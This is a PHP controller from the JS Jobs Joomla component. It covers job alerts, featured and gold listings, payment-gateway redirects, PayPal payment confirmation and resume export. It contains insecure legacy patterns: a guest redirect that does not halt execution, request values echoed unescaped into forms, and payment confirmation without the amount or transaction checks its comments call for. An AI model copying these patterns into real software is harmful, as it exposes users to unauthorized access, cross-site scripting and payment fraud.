<?php
/**
 * @Copyright Copyright (C) 2009-2011
 * @license GNU/GPL http://www.gnu.org/copyleft/gpl.html
 + Created by:          Ahmad Bilal
 * Company:		Buruj Solutions
 + Contact:		www.burujsolutions.com , ahmad@burujsolutions.com
 * Created on:	Jan 11, 2009
 ^
 + Project: 		JS Jobs
 * File Name:	controllers/jsjobs.php
 ^ 
 * Description: Controller class for application data
 ^ 
 * History:		NONE
 ^ 
 */
defined('_JEXEC') or die('Restricted access');

jimport('joomla.application.component.controller');

class JSJobsControllerJsjobs extends JControllerLegacy
{
	var $_router_mode_sef = null;
	
	function __construct()
	{
		$app = &JFactory::getApplication();
		$user	=& JFactory::getUser();
		if ($user->guest) { // redirect user if not login
			$link = 'index.php?option=com_user';
			$this->setRedirect($link);
		} 
		$router = $app->getRouter();		
		if($router->getMode() == JROUTER_MODE_SEF) {
			$this->_router_mode_sef = 1; // sef true
		}else{
			$this->_router_mode_sef = 2; // sef false
		}				

		parent :: __construct();
	}
	function validatesite(){
		$common_model = $this->getModel('common', 'JSJobsModel');
		$server_serial_number=$common_model->getServerSerialNumber();
		echo  $server_serial_number;
		JFactory::getApplication()->close();		
	}
	function unsubscribeJobAlertSetting (){
		$data = JRequest :: get('post');
		$email = $data['contactemail'];
		global $mainframe;
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$return_value = $jobseeker_model->unSubscribeJobAlert($email);
		if(is_array($return_value)){
				if($return_value['isunsubjobalert']==1){
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Unsubscribe Job Alert";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
				}elseif($return_value['isunsubjobalert']==0){
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Unsubscribe Job Alert";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
				}
				$msg = JText :: _('JS_YOU_UNSUBSCRIBE_SUCCESSFULLY_JOBALERT');
		}else{
			if($return_value ==1){
				$msg = JText :: _('JS_YOU_UNSUBSCRIBE_SUCCESSFULLY_JOBALERT');
			}elseif($return_value == 3){
				$msg = JText :: _('JS_YOU_ENTER_INCORRECT_EMAIL_JOBALERT');
			}else{
				$msg = JText :: _('JS_ERROR_UNSUBSCRIBE_JOBALERT');
			}
		}	
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=jobalertsetting&Itemid='.$Itemid;
		$this->setRedirect(JRoute::_($link), $msg);
	}
	
	function addtofeaturedresumes()
	{
		global $mainframe;
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$Itemid =  JRequest::getVar('Itemid');
		$user	=& JFactory::getUser();
		$uid=$user->id;
		$resumeid=($this->_router_mode_sef==2)? $common_model->parseId(JRequest::getVar('rd','')):JRequest::getVar('rd','');
		
		$return_value = $jobseeker_model->storeFeaturedResume($uid,$resumeid);
		if ($return_value == 1)	{
			$msg = JText :: _('JS_FEATURED_RESUME_SAVED');
		}else if ($return_value == 2){
			$msg = JText :: _('JS_FILL_REQ_FIELDS');
		}else if ($return_value == 3){
			$msg = JText :: _('JS_RESUME_NOT_EXIST');
		}else if ($return_value == 5){
			$msg = JText :: _('JS_CAN_NOT_ADD_NEW_FEATURED_RESUME');
		}else if ($return_value == 6){
			$msg = JText :: _('JS_ALREADY_ADDED_FEATURED_RESUME');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_FEATURED_RESUME');
		}

		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myresumes&Itemid='.$Itemid;
                //$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	
	function addtogoldresumes() 
	{
		global $mainframe;
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');

		$Itemid =  JRequest::getVar('Itemid');
		$user	=& JFactory::getUser();
		$uid=$user->id;
		$resumeid=($this->_router_mode_sef==2)? $common_model->parseId(JRequest::getVar('rd','')):JRequest::getVar('rd','');
		$return_value = $jobseeker_model->storeGoldResume($uid,$resumeid);
		if ($return_value == 1)	{
			$msg = JText :: _('JS_GOLD_RESUME_SAVED');
		}else if ($return_value == 2){
			$msg = JText :: _('JS_FILL_REQ_FIELDS');
		}else if ($return_value == 3){
			$msg = JText :: _('JS_RESUME_NOT_EXIST');
		}else if ($return_value == 5){
			$msg = JText :: _('JS_CAN_NOT_ADD_NEW_GOLD_RESUME');
		}else if ($return_value == 6){
			$msg = JText :: _('JS_ALREADY_ADDED_GOLD_RESUME');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_GOLD_RESUME');
		}
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myresumes&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	
	
	
	
	function addtofeaturedcompany() 
	{
		global $mainframe;
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$Itemid =  JRequest::getVar('Itemid');

		$user	=& JFactory::getUser();
		$uid=$user->id;
		if($this->_router_mode_sef==2){
			$companyid=$common_model->parseId(JRequest::getVar('md',''));
		}else{
			$companyid =  JRequest::getVar('md','');	
		} 
		$packageid =  JRequest::getVar('pk','');	
		$return_value = $employer_model->storeFeaturedCompany($uid, $companyid);
                if ($return_value == 1)	{
			$msg = JText :: _('JS_FEATURED_COMPANY_SAVED');
		}else if ($return_value == 2){
			$msg = JText :: _('JS_FILL_REQ_FIELDS');
		}else if ($return_value == 3){
			$msg = JText :: _('JS_CMPANY_NOT_EXIST');
		}else if ($return_value == 5){
			$msg = JText :: _('JS_CAN_NOT_ADD_NEW_FEATURED_COMPANY');
		}else if ($return_value == 6){
			$msg = JText :: _('JS_ALREADY_ADDED_FEATURED_COMPANY');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_FEATURED_COMPANY');
		}

		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=mycompanies&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	
	function addtogoldcompany() 
	{
		global $mainframe;
		
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$Itemid =  JRequest::getVar('Itemid');

		$user	=& JFactory::getUser();
		$uid=$user->id;
		if($this->_router_mode_sef==2){
			$companyid=$common_model->parseId(JRequest::getVar('md',''));
		}else{
			$companyid =  JRequest::getVar('md','');	
		} 
		
		$packageid =  JRequest::getVar('pk','');	
		$return_value = $employer_model->storeGoldCompany($uid, $companyid);
		if ($return_value == 1)	{
			$msg = JText :: _('JS_GOLD_COMPANY_SAVED');
		}else if ($return_value == 2){
			$msg = JText :: _('JS_FILL_REQ_FIELDS');
		}else if ($return_value == 3){
			$msg = JText :: _('JS_COMPANY_NOT_EXIST');
		}else if ($return_value == 5){
			$msg = JText :: _('JS_CAN_NOT_ADD_NEW_GOLD_COMPANY');
		}else if ($return_value == 6){
			$msg = JText :: _('JS_ALREADY_ADDED_GOLD_COMPANY');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_GOLD_COMPANY');
		}

		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=mycompanies&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	
	
	function addtofeaturedjobs() //save employer package
	{
		global $mainframe;
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$Itemid =  JRequest::getVar('Itemid');

		$user	=& JFactory::getUser();
		$uid=$user->id;
		if($this->_router_mode_sef==2){
			$jobid=$common_model->parseId(JRequest::getVar('oi',''));
		}else{
			$jobid =  JRequest::getVar('oi','');	
		} 
		
		
		$return_value = $employer_model->storeFeaturedJobs($uid, $jobid);
                if ($return_value == 1)	{
			$msg = JText :: _('JS_FEATURED_JOB_SAVED');
		}else if ($return_value == 2){
			$msg = JText :: _('JS_FILL_REQ_FIELDS');
		}else if ($return_value == 3){
			$msg = JText :: _('JS_JOB_NOT_APPROVED');
		}else if ($return_value == 5){
			$msg = JText :: _('JS_CAN_NOT_ADD_NEW_FEATURED_JOB');
		}else if ($return_value == 6){
			$msg = JText :: _('JS_ALREADY_ADDED_FEATURED_JOB');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_FEATURED_JOB');
		}

		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myjobs&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	function addtogoldjobs() 
	{
		global $mainframe;
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$Itemid =  JRequest::getVar('Itemid');
		
		$user	=& JFactory::getUser();
		$uid=$user->id;
		if($this->_router_mode_sef==2){
			$jobid =  $common_model->parseId(JRequest::getVar('oi',''));
		}else{
			$jobid =  JRequest::getVar('oi','');
		}
		$return_value = $employer_model->storeGoldJobs($uid, $jobid);
		if ($return_value == 1)	{
			$msg = JText :: _('JS_GOLD_JOB_SAVED');
		}else if ($return_value == 2){
			$msg = JText :: _('JS_FILL_REQ_FIELDS');
		}else if ($return_value == 3){
			$msg = JText :: _('JS_JOB_NOT_APPROVED');
		}else if ($return_value == 5){
			$msg = JText :: _('JS_CAN_NOT_ADD_NEW_GOLD_JOB');
		}else if ($return_value == 6){
			$msg = JText :: _('JS_ALREADY_ADDED_GOLD_JOB');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_GOLD_JOB');
		}

		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myjobs&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	function saveemployerpayment() //save employer payment
	{
		global $mainframe;
                $data = JRequest :: get('post');
                $packageid = $data['packageid'];
                $payment_method=$data['paymentmethod'];
                $package_forr=$data['packagefor'];

                ?>
                <div width="100%" align="center">
                <br><br><br><h2>Please wait</h2>
                
                <img src="components/com_jsjobs/images/working.gif" border="0" >
                </div>
                <?php

                $reser_med = date('misyHdmy');
                $reser_med = md5($reser_med);
                $reser_med = md5($reser_med);
                $reser_med1 = substr($reser_med,0,5);
                $reser_med2 .= substr($reser_med,7,13);
                $string = md5(time());
                $string = md5(time());
                $reser_start =	substr($string,0,3);
                $reser_end = substr($string,3,2);
                $reference = $reser_start.$reser_med1.$reser_med2.$reser_end;
                $_SESSION['jsjobs_rfd_emppack'] = $reference;


		$common_model = $this->getModel('Common', 'JSJobsModel');
		$Itemid =  JRequest::getVar('Itemid');
		
		//$return_value = $model->storeEmployerPackageHistory($reference,0,$data);
		$return_value = $common_model->storePackageHistory(0,$data);
		if ($return_value != false)	{
			$msg = JText :: _('JS_PACKAGE_SAVED');
			$paymentfor = JRequest::getVar('paymentmethod','');
			$packagefor = JRequest::getVar('packagefor','');
			if($paymentfor != 'free'){
				$this->setRedirect('index.php?option=com_jsjobs&c=paymentnotify&task=onorder&orderid='.$return_value.'&for='.$paymentfor.'&packagefor='.$packagefor);
			}else{
				if ($return_value === 'cantgetpackagemorethenone'){
						$msg = JText :: _('JS_CAN_NOT_GET_FREE_PACKAGE_MORE_THEN_ONCE');
						$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=packages&Itemid='.$Itemid;
						$this->setRedirect(JRoute::_($link), $msg);
				}elseif($return_value ==false){
						$msg = JText :: _('JS_ERROR_SAVING_PACKAGE');
						$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=package_buynow&Itemid='.$Itemid;
						$this->setRedirect(JRoute::_($link), $msg);
				}else{
						$msg = JText :: _('JS_PACKAGE_SAVED');
						$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=purchasehistory&Itemid='.$Itemid;
						$this->setRedirect(JRoute::_($link), $msg);
				}
			}
                        //$this->redirectforpayment(1,$packageid,$reference);
                        //$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=purchasehistory&Itemid='.$Itemid;
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_PACKAGE');
			$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=package_buynow&Itemid='.$Itemid;
			$this->setRedirect(JRoute::_($link), $msg);
			
		} 

	}

        function redirectforpayment($packagefor,$packageid,$reference)
        {
			
			$common_model = $this->getModel('Common', 'JSJobsModel');
			$employer_model = $this->getModel('Employer', 'JSJobsModel');
			$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
            $Itemid =  JRequest::getVar('Itemid');
            
            $host = $_SERVER['HTTP_HOST'];
            $self = $_SERVER['PHP_SELF'];
            $url = "http://$host$self";

            $result = $common_model->getConfigByFor('payment');
            if ($packagefor == 1) $package = $employer_model->getEmployerPackageInfoById($packageid); // employer
            elseif ($packagefor == 2) $package = $jobseeker_model->getJobSeekerPackageInfoById($packageid); // jobseeker
            if(isset($package) == false){
		$msg = JText :: _('JS_ERROR_SAVING_PACKAGE');
                if ($packagefor == 1) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=package_buynow&Itemid='.$Itemid;
                elseif ($packagefor == 2) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=package_buynow&Itemid='.$Itemid;
                //$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);

            }
            $defaultmsg = JText :: _('JS_PACKAGE_SAVED');
            if ($packagefor == 1) $defaultlink = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=purchasehistory&Itemid='.$Itemid;
            elseif ($packagefor == 2) $defaultlink = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=purchasehistory&Itemid='.$Itemid;

            $purpose = $package->name;
            if ($package->price != 0){
               $curdate = date('Y-m-d H:i:s');
                if (($package->discountstartdate <= $curdate) && ($package->discountenddate >= $curdate)){
                     if($package->discounttype == 1){
                         $discountamount = ($package->price * $package->discount)/100;
                          $amount = $package->price - $discountamount;

                     }else{
                         $amount = $package->price - $package->discount;

                     }
                }else $amount = $package->price;
            }else{
				$msg = JText :: _('JS_PACKAGE_SAVED');
                if ($packagefor == 1) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=purchasehistory&Itemid='.$Itemid;
                elseif ($packagefor == 2) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=purchasehistory&Itemid='.$Itemid;
                //$this->setRedirect($link, $msg);
				$this->setRedirect(JRoute::_($link), $msg);

            }
            
            if ($packagefor == 1) $sopping_url = $url.'?option=com_jsjobs&view=employer&layout=packages&Itemid='. $Itemid;
            elseif ($packagefor == 2) $sopping_url = $url.'?option=com_jsjobs&view=jobseeker&layout=packages&Itemid='. $Itemid;

            if( $result['payment_method'] == 'paypal'){ //paypal
                $paypal_account= $result['payment_paypalaccount'];
                $currency_code= $result['payment_currency'];
                $successeful_url = $url.'?option=com_jsjobs&task=confirmpaymnt&for='.$packagefor.'&fr='.$reference.'&Itemid='. $Itemid;
                $cancel_url= $result['payment_cancelurl'];
                $show_description= $result['payment_showdescription'];
                $description= $result['payment_description'];
                $testmode = $result['payment_test_mode'];
                if( $result['payment_showfooter'] == '1') $show_footer= 'show_footer';
                else  $show_footer= 'hide_footer';

                if ($testmode == '1') $act = "https://www.sandbox.paypal.com/cgi-bin/webscr";
                      else $act = "https://www.paypal.com/cgi-bin/webscr"; ?>
                <form action="<?php echo $act; ?>" method="post" name="adminForm" >
                <input type="hidden" name="business" value="<?php echo $paypal_account; ?>">
                <input type="hidden" name="cmd" value="_cart">
                <input type="hidden" name="add" value="1">
                <input type="hidden" name="item_name" value="<?php echo $purpose; ?>">
                <input type="hidden" name="amount" value="<?php echo $amount; ?>">
                <input type="hidden" name="currency_code" value="<?php echo $currency_code; ?>">
                <input type="hidden" name="return" value="<?php echo $successeful_url; ?>">
                <input type="hidden" name="notify_url" value="<?php echo $successeful_url; ?>">
                <input type="hidden" name="cancel_return" value="<?php echo $cancel_url; ?>">
                <input type="hidden" name="rm" value="2">
                <input type="hidden" name="shopping_url" value="<?php echo $sopping_url; ?>"><!-- Display the payment button. -->
                            <script language=Javascript>
                                    //document.adminForm.shopping_url.value = window.location.href;
                                    document.adminForm.submit();
                            </script>
                </form>
            <?php
            }elseif( $result['payment_method'] == 'fastspring'){ //fast spring
                if ($package->fastspringlink) $this->setRedirect($package->fastspringlink); // not empty
                else $this->setRedirect(JRoute::_($defaultlink), $defaultmsgmsg);
            }elseif( $result['payment_method'] == 'authorizenet'){ //authorize.net
                //<form name="PrePage" method = "post" action = "https://scotest.authorize.net/payment/CatalogPayment.aspx">
                ?>
                    <form name="PrePage" method = "post" action = "https://Simplecheckout.authorize.net/payment/CatalogPayment.aspx">
                    <input type = "hidden" name = "LinkId" value ="<?php echo $package->otherpaymentlink; ?>" />
                    <script language=Javascript>
                            document.PrePage.submit();
                    </script>
                </form>
                <?php
            }elseif( $result['payment_method'] == 'pagseguro'){ //pagseguro ?>
                    <form name="pagseguro"  method="post" action="https://pagseguro.uol.com.br/checkout/checkout.jhtml">
                    <input type="hidden" name="email_cobranca" value="<?php echo $result['pagseguro_email']; ?>">
                    <input type="hidden" name="tipo" value="CP">
                    <input type="hidden" name="moeda" value="BRL">

                    <input type="hidden" name="item_id_1" value="1">
                    <input type="hidden" name="item_descr_1" value="<?php echo $package->title; ?>">
                    <input type="hidden" name="item_quant_1" value="1">
                    <input type="hidden" name="item_valor_1" value="<?php echo number_format($amount, 2); ?>">
                    <input type="hidden" name="item_frete_1" value="0">
                    <input type="hidden" name="item_peso_1" value="0">


                    <input type="hidden" name="tipo_frete" value="EN">
                <script language=Javascript>
                        document.pagseguro.submit();
                </script>
                    </form>
            <?php
            }elseif( $result['payment_method'] == '2checkout'){ //2checkout
                if($package->otherpaymentlink) $this->setRedirect($package->otherpaymentlink); // not empty
                else $this->setRedirect(JRoute::_($defaultlink), $defaultmsgmsg);
            }elseif( $result['payment_method'] == 'other'){ //other
                if($package->otherpaymentlink) $this->setRedirect($package->otherpaymentlink); // not empty
                else $this->setRedirect(JRoute::_($defaultlink), $defaultmsgmsg);
            }else{
		$this->setRedirect(JRoute::_($defaultlink), $defaultmsgmsg);
            }

        }

        function confirmpaymnt() //confirm paypal payment
        {
			$common_model = $this->getModel('Common', 'JSJobsModel');
			$employer_model = $this->getModel('Employer', 'JSJobsModel');
			$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
            $Itemid =  JRequest::getVar('Itemid');
            $result = $common_model->getConfigByFor('payment');
                // paypal code

		if ($_GET['fr'] != "") {
			$referenceid = $_GET['fr'];
		}
		if ($_GET['for'] != "") $for = $_GET['for'];
		$req = 'cmd=_notify-synch';

		if ($_GET['tx'] != "")
			$tx_token = $_GET['tx'];
		if (isset($_SESSION['jsjobs_rq_session'])) $_SESSION['jsjobs_rq_session']='';

		$auth_token = $result['payment_authtoken'];
		$req .= "&tx=$tx_token&at=$auth_token";

		// post back to PayPal system to validate
		$header .= "POST /cgi-bin/webscr HTTP/1.0\r\n";
		$header .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$header .= "Content-Length: " . strlen($req) . "\r\n\r\n";
		$testmode = $result['payment_test_mode'];
		if ($testmode == '1') $act = "www.sandbox.paypal.com";
		  else $act = "www.paypal.com";
		//$fp = fsockopen ("$act", 80, $errno, $errstr, 30);
		$fp = fsockopen('ssl://'.$act,"443",$err_num,$err_str,30);

		// If possible, securely post back to paypal using HTTPS
		// Your PHP server will need to be SSL enabled
		// $fp = fsockopen ('ssl://www.paypal.com', 443, $errno, $errstr, 30);

		if (!$fp) {
			// HTTP ERROR
		} else {
			fputs ($fp, $header . $req);
			// read the body data
			$res = '';
			$headerdone = false;
			while (!feof($fp)) {
				$line = fgets ($fp, 1024);
				if (strcmp($line, "\r\n") == 0) {
					// read the header
					$headerdone = true;
				}
				else if ($headerdone)
				{
					// header has been read. now read the contents
					$res .= $line;
				}
			}

			// parse the data
			$lines = explode("\n", $res);
			$keyarray = array();
			$paypalstatus = $lines[0];
			$date = date('Y-m-d H:i:s');
			$status = 1;
			if (strcmp ($lines[0], "SUCCESS") == 0) {
				for ($i=1; $i<count($lines);$i++){
					list($key,$val) = explode("=", $lines[$i]);
					$keyarray[urldecode($key)] = urldecode($val);
				}
				// check the payment_status is Completed
				// check that txn_id has not been previously processed
				// check that receiver_email is your Primary PayPal email
				// check that payment_amount/payment_currency are correct
				// process payment
				$firstname = $keyarray['first_name'];
				$lastname = $keyarray['last_name'];
				$itemname = $keyarray['item_name'];
				$amount = $keyarray['payment_gross'];
				$email = $keyarray['payer_email'];

				$itemname = $keyarray['item_name1'];

                            if ($for == 1)$return_value =  $employer_model->updateEmployerPackageHistory($firstname,$lastname, $email, $amount, $referenceid, $tx_token, $date, $paypalstatus,$status);
                            elseif ($for == 2)$return_value =  $jobseeker_model->updateJobSeekerPackageHistory($firstname,$lastname, $email, $amount, $referenceid, $tx_token, $date, $paypalstatus,$status);

				$msg = JText :: _('JS_THNAK_YOU_TO_BUY_PACKAGE');
                if ($for == 1) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=purchasehistory&Itemid='.$Itemid;
                elseif ($for == 2) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=purchasehistory&Itemid='.$Itemid;
			}
			else if (strcmp ($lines[0], "FAIL") == 0) {
				$msg = JText :: _('JS_WE_ARE_UNABLE_TO_VERIFY_PAYMENT');
                if ($for == 1) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=purchasehistory&Itemid='.$Itemid;
                elseif ($for == 2) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=purchasehistory&Itemid='.$Itemid;
			}


		}

		fclose ($fp);
		$this->setRedirect(JRoute::_($link), $msg);

        }

        function savejobseekerpayment() //save job seeker payment
	{
				global $mainframe;
				$common_model = $this->getModel('Common', 'JSJobsModel');
				
                $data = JRequest :: get('post');
                $packageid = $data['packageid'];
                $packageid = $data['packageid'];
                $payment_method=$data['paymentmethod'];
                $package_forr=$data['packagefor'];

                ?>
                <div width="100%" align="center">
                <br><br><br><h2>Please wait</h2>

                <img src="components/com_jsjobs/images/working.gif" border="0" >
                </div>
                <?php

                $reser_med = date('misyHdmy');
                $reser_med = md5($reser_med);
                $reser_med = md5($reser_med);
                $reser_med1 = substr($reser_med,0,5);
                $reser_med2 .= substr($reser_med,7,13);
                $string = md5(time());
                $string = md5(time());
                $reser_start =	substr($string,0,3);
                $reser_end = substr($string,3,2);
                $reference = $reser_start.$reser_med1.$reser_med2.$reser_end;
                $_SESSION['jsjobs_rfd_emppack'] = $reference;


		$Itemid =  JRequest::getVar('Itemid');


		
		
		//$return_value = $model->storeJobSeekerPackageHistory($reference,0,$data);
		$return_value = $common_model->storePackageHistory(0,$data);
		if ($return_value != false)	{
			$msg = JText :: _('JS_PACKAGE_SAVED');
			$paymentfor = JRequest::getVar('paymentmethod','');
			$packagefor = JRequest::getVar('packagefor','');
			if($paymentfor != 'free'){
				$this->setRedirect('index.php?option=com_jsjobs&c=paymentnotify&task=onorder&orderid='.$return_value.'&for='.$paymentfor.'&packagefor='.$packagefor);
			}else{
				if ($return_value === 'cantgetpackagemorethenone'){
						$msg = JText :: _('JS_CAN_NOT_GET_FREE_PACKAGE_MORE_THEN_ONCE');
						$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=packages&Itemid='.$Itemid;
						$this->setRedirect(JRoute::_($link), $msg);
				}elseif($return_value ==false){
						$msg = JText :: _('JS_ERROR_SAVING_PACKAGE');
						$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=package_buynow&Itemid='.$Itemid;
						$this->setRedirect(JRoute::_($link), $msg);
				}else{
						$msg = JText :: _('JS_PACKAGE_SAVED');
						$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=purchasehistory&Itemid='.$Itemid;
						$this->setRedirect(JRoute::_($link), $msg);
				}
			}
			//$this->redirectforpayment(2,$packageid,$reference);
			//$msg = JText :: _('JS_PACKAGE_SAVED');
                        //$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=purchasehistory&Itemid='.$Itemid;
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_PACKAGE');
			$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=packages&Itemid='.$Itemid;
			$this->setRedirect(JRoute::_($link), $msg);
		}
		
		
		//$this->setRedirect($link, $msg);
		//$this->setRedirect(JRoute::_($link), $msg);
		
	}

	function jobapply()
	{
		global $mainframe;
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');

		$return_value = $jobseeker_model->jobapply();
		if(is_array($return_value)){
				if($return_value['isjobapplystore']==1){
					if($return_value['status']=="Jobapply Sucessfully"){
						$serverjobapplystatus="ok";
					} 
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Jobapply";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverjobapplystatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'jobapply');
				}elseif($return_value['isjobapplystore']==0){
					if($return_value['status']=="Data Empty"){
						$serverjobapplystatus="Data not post on server";
					}elseif($return_value['status']=="Jobapply Saving Error"){
						$serverjobapplystatus="Error Jobapply Saving";
					}elseif($return_value['status']=="Auth Fail"){
						$serverjobapplystatus="Authentication Fail";
					}
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Jobapply";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverjobapplystatus,$logarray['referenceid'],$serverid,$logarray['uid'],'jobapply');
				}
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myappliedjobs&uid='.$uid.'&Itemid='.$Itemid;
				$msg = JText :: _('APPLICATION_APPLIED');
		}else{
			if ($return_value == 1)	{
				$msg = JText :: _('APPLICATION_APPLIED');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myappliedjobs&uid='.$uid.'&Itemid='.$Itemid;
			}else if ($return_value == 3){
				$msg = JText :: _('JS_ALREADY_APPLY_JOB');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myappliedjobs&Itemid='.$Itemid;
			}else{
				$msg = JText :: _('ERROR_APPLING_APPLICATION');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myappliedjobs&uid='.$uid.'&Itemid='.$Itemid;
			}
			
		}
		
		///final redirect
		$this->setRedirect(JRoute::_($link), $msg);
	}
/* STRAT EXPORT RESUMES */
	function exportallresume(){
		$jobid =  JRequest::getVar('bd');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		
		$return_value = $jobseeker_model->setAllExport($jobid);
		if($return_value == true){
			// Push the report now!
			$msg = JText ::_('JS_RESUME_EXPORT');
			$name = 'export-resumes';
			header("Content-type: application/octet-stream");
			header("Content-Disposition: attachment; filename=".$name.".xls");
			header("Pragma: no-cache");
			header("Expires: 0");
			header("Lacation: excel.htm?id=yes");
			print $return_value ;
			die();   
			
		}else{
			//echo $return_value ;
			$msg = JText ::_('JS_RESUME_NOT_EXPORT');
		}		
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=job_appliedapplications&bd='.$jobid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
		
		
	}
	function exportresume(){
		$jobid =  JRequest::getVar('bd');
		$resumeid =  JRequest::getVar('rd');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		
		$return_value = $jobseeker_model->setExport($jobid,$resumeid);
		if($return_value == true){
			// Push the report now!
			$msg = JText ::_('JS_RESUME_EXPORT');
			$name = 'export-resume';
			header("Content-type: application/octet-stream");
			header("Content-Disposition: attachment; filename=".$name.".xls");
			header("Pragma: no-cache");
			header("Expires: 0");
			header("Lacation: excel.htm?id=yes");
			print $return_value ;
			die();   
			
		}else{
			//echo $return_value ;
			$msg = JText ::_('JS_RESUME_NOT_EXPORT');
		}		
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=job_appliedapplications&bd='.$jobid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
		
	}
/* END EXPORT RESUMES */
	
	function showImage(){
   }
	

